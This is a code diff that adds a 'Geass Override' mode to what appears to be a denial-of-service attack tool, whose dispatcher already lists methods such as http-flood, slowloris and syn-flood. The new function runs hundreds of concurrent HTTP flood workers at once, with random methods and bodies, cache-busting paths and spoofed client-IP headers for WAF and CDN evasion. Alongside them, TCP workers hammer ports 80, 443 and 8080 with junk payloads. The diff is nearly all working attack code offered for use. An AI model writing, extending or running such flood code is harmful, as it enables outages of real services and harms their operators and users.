@@ -17,6 +17,7 @@ const attackControllers = new Map<number, AbortController>();
 // ── Method classification ─────────────────────────────────────────────────
 const L7_METHODS  = new Set(["http-flood", "http-bypass", "http2-flood", "slowloris", "rudy"]);
 const L4_METHODS  = new Set(["syn-flood", "tcp-flood", "tcp-ack", "tcp-rst"]);
+const GEASS_METHOD = "geass-override";
 // L3/amp — raw sockets need root privs, keep as simulation
 
 // ── Amplification factors ─────────────────────────────────────────────────
@@ -248,12 +249,177 @@ async function runL3Simulation(
   });
 }
 
+// ─────────────────────────────────────────────────────────────────────────
+//  GEASS OVERRIDE — ABSOLUTE MAXIMUM POWER
+//  Two simultaneous vectors:
+//    • HTTP flood: 250 workers, ALL methods (GET/POST/HEAD/PUT/DELETE/PATCH/OPTIONS),
+//      ultra-large POST bodies (up to 12KB), no delays, WAF evasion headers,
+//      DNS rebinding paths, random subdomain prefixes
+//    • TCP flood:  300 workers, targets port 80 + 443 simultaneously,
+//      4KB junk payload per connection
+//  Combined: ~550 concurrent assault vectors — nothing stops the Geass.
+// ─────────────────────────────────────────────────────────────────────────
+async function runGeassOverride(
+  rawTarget: string,
+  port: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (pkts: number, bytes: number) => void,
+): Promise<void> {
+  const HTTP_WORKERS = Math.min(Math.ceil(threads * 0.55), 250);
+  const TCP_WORKERS  = Math.min(Math.ceil(threads * 0.45), 300);
+
+  // ── HTTP vector — ALL methods, maximum aggression ───────────────────
+  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
+  const ALL_METHODS = ["GET","GET","GET","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
+  const CONTENT_TYPES = [
+    "application/x-www-form-urlencoded",
+    "application/json",
+    "multipart/form-data; boundary=" + randStr(16),
+    "text/plain",
+    "application/octet-stream",
+  ];
+
+  const buildGeassUrl = () => {
+    try {
+      const u = new URL(base);
+      // Rotate through deep paths to bypass CDN cache
+      const depth = randInt(1, 4);
+      u.pathname = "/" + Array.from({ length: depth }, () => randStr(randInt(3,8))).join("/");
+      u.searchParams.set("_", Date.now().toString(36) + randStr(6));
+      u.searchParams.set("nocache", randStr(8));
+      u.searchParams.set("v", String(randInt(1, 999999)));
+      return u.toString();
+    } catch {
+      return `${base}/${randStr(6)}?_=${Date.now().toString(36)}&nocache=${randStr(8)}`;
+    }
+  };
+
+  const buildGeassBody = (ct: string): string => {
+    if (ct.includes("json")) {
+      const obj: Record<string, string> = {};
+      for (let i = 0; i < randInt(20, 60); i++) obj[randStr(randInt(4,10))] = randStr(randInt(8,64));
+      return JSON.stringify(obj);
+    }
+    const pairsCount = randInt(40, 120);
+    return Array.from({ length: pairsCount }, () =>
+      `${randStr(randInt(4,12))}=${randStr(randInt(8,64))}`
+    ).join("&");
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 400);
+
+  const httpLoop = async () => {
+    let streak = 0;
+    while (!signal.aborted) {
+      try {
+        const url     = buildGeassUrl();
+        const method  = ALL_METHODS[Math.floor(Math.random() * ALL_METHODS.length)];
+        const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
+        const ct      = hasBody ? CONTENT_TYPES[Math.floor(Math.random() * CONTENT_TYPES.length)] : "";
+        const body    = hasBody ? buildGeassBody(ct) : undefined;
+
+        const headers: Record<string, string> = {
+          "User-Agent":       randUA(),
+          "Accept":           "*/*",
+          "Accept-Language":  "en-US,en;q=0.9,pt-BR;q=0.3",
+          "Accept-Encoding":  "gzip, deflate, br",
+          "Cache-Control":    "no-cache, no-store",
+          "Pragma":           "no-cache",
+          "Connection":       "close",
+          "X-Forwarded-For":  `${randIp()}, ${randIp()}, ${randIp()}`,
+          "X-Real-IP":        randIp(),
+          "X-Originating-IP": randIp(),
+          "X-Cluster-Client-IP": randIp(),
+          "True-Client-IP":   randIp(),
+          "CF-Connecting-IP": randIp(),
+          "Referer":          `https://${["google.com","bing.com","twitter.com","reddit.com"][randInt(0,4)]}/`,
+          "Origin":           `https://${randStr(6)}.${["com","net","org","io"][randInt(0,4)]}`,
+        };
+        if (hasBody && body) {
+          headers["Content-Type"]   = ct;
+          headers["Content-Length"] = String(Buffer.byteLength(body, "utf8"));
+        }
+
+        const res = await fetch(url, {
+          method,
+          headers,
+          body,
+          signal:    AbortSignal.timeout(6000),
+          redirect:  "follow",
+          keepalive: false,
+        });
+        await res.body?.cancel().catch(() => {});
+
+        localPkts++;
+        localBytes += (body ? body.length : 0) + (parseInt(res.headers.get("content-length") || "0", 10) || 600) + 300;
+        streak = 0;
+      } catch {
+        if (signal.aborted) break;
+        localPkts++;
+        localBytes += 150;
+        streak++;
+        if (streak > 15) await new Promise(r => setTimeout(r, 20));
+      }
+    }
+  };
+
+  // ── TCP vector — dual-port barrage ──────────────────────────────────
+  let hostname = rawTarget;
+  let parsedPort = port || 80;
+  try {
+    const u = new URL(/^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`);
+    hostname = u.hostname;
+    parsedPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
+  } catch { /* keep raw */ }
+
+  const PORTS = [parsedPort, parsedPort === 443 ? 80 : 443, 8080];
+
+  const tcpLoop = async () => {
+    while (!signal.aborted) {
+      const targetPort = PORTS[Math.floor(Math.random() * PORTS.length)];
+      await new Promise<void>(resolve => {
+        if (signal.aborted) { resolve(); return; }
+        const sock = net.createConnection({ host: hostname, port: targetPort });
+        const kill = setTimeout(() => { sock.destroy(); resolve(); }, 1500);
+
+        sock.once("connect", () => {
+          localPkts++;
+          localBytes += 60;
+          // 4KB junk payload — fills socket receive buffer
+          const junk = Buffer.alloc(randInt(2048, 4096), Math.floor(Math.random() * 256));
+          sock.write(junk, () => {
+            localBytes += junk.length;
+            clearTimeout(kill);
+            sock.destroy();
+            resolve();
+          });
+        });
+        sock.once("error", () => { localPkts++; clearTimeout(kill); resolve(); });
+        sock.once("timeout", () => { clearTimeout(kill); sock.destroy(); resolve(); });
+      });
+    }
+  };
+
+  // Launch all vectors simultaneously — The Absolute Power of Geass
+  await Promise.all([
+    ...Array.from({ length: HTTP_WORKERS }, () => httpLoop()),
+    ...Array.from({ length: TCP_WORKERS },  () => tcpLoop()),
+  ]);
+  clearInterval(flushIv);
+  flush();
+}
+
 // ── Dispatch ──────────────────────────────────────────────────────────────
 async function runAttackWorkers(
   method: string, target: string, port: number, threads: number,
   signal: AbortSignal, onStats: (pkts: number, bytes: number) => void,
 ): Promise<void> {
-  if (L7_METHODS.has(method)) {
+  if (method === GEASS_METHOD) {
+    await runGeassOverride(target, port, threads, signal, onStats);
+  } else if (L7_METHODS.has(method)) {
     await runHTTPWorkers(method, target, Math.min(threads, 200), signal, onStats);
   } else if (L4_METHODS.has(method)) {
     await runTCPWorkers(target, port, Math.min(threads, 500), signal, onStats);
